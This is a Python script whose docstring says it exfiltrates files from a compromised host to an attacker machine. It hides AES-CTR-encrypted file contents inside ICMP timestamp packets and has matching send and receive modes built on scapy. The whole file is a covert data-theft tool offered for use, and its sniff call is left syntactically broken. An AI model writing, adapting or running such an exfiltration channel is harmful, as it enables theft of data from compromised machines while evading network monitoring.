"""
The script exfiltrates files from a compromised host to an attacker machine using encrypted ICMP packets (marked as type 13 = timestamp).
Libraries used: scapy and pycryptodome (already present in the containers).
"""
from scapy.all import IP, ICMP, Raw, send, sniff
from sys import argv
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os
import sys

def receive_mode(key_hex: str, output_filename: str):
    # e.g. 4f61b0c950a29471168925501869894e hexadecimal byte string
    key = bytes.fromhex(key_hex)

    def packet_callback(packet):
        if ICMP not in packet or packet[ICMP].type != 13 or Raw not in packet:
            return

        payload = packet[Raw].load
        nonce = payload[:8]
        ciphertext = payload[8:]
        ctr = Counter.new(64, prefix=nonce)
        cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
        plaintext = cipher.decrypt(ciphertext)

        with open(output_filename, "wb") as f:
            f.write(plaintext)

        sys.exit(0)

    # sniff for ICMP Type 13 packets
    sniff(filter="icmp", prn=packet_callback, store=False, stop_filter=)

def send_mode(key_hex: str, filename: str, receiver_ip: str):
    key = bytes.fromhex(key_hex)

    with open(filename, "rb") as f:
        plaintext = f.read()

    # nonce to make each cryptographic operation unique (even for the same key-message pair)
    nonce = os.urandom(8)
    ctr = Counter.new(64, prefix=nonce)
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
    ciphertext = cipher.encrypt(plaintext)
    payload = nonce + ciphertext

    # using type 13 = timestamp, instead of echoing to avoid having it sent back
    packet = IP(dst=receiver_ip) / ICMP(type=13, id=0x1222, seq=1) / Raw(load=payload)
    send(packet, verbose=False)

def main():
    if len(argv) < 2:
        sys.exit(1)

    if argv[1] == "send":
        if len(argv) != 5:
            sys.exit(1)
        if not os.path.exists(argv[3]):
            sys.exit(1)
        send_mode(argv[2], argv[3], argv[4])
    elif argv[1] == "receive":
        if len(argv) != 4:
            sys.exit(1)
        receive_mode(argv[2], argv[3])

if __name__ == "__main__":
    main()
